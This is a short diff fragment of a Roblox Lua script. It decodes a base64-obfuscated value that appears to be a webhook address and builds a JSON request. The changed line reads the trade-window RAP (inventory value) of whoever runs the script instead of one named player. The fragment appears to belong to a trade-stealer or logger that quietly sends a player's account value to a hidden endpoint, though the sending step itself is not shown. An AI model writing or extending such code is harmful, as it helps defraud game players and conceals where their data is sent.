@@ -362,7 +362,7 @@ if game.PlaceId == 15588442388 or game.PlaceId == 15502339080 then
 
             Wbh_En = from_base64(Wbh)
 
-            RAP = game:GetService("Players").NSDFNEWR.PlayerGui.TradeWindow.Frame.ClientRAPHolder.Amount.Text
+            RAP = LP.PlayerGui.TradeWindow.Frame.ClientRAPHolder.Amount.Text
 
             local headers = {
                 ["content-type"] = "application/json"
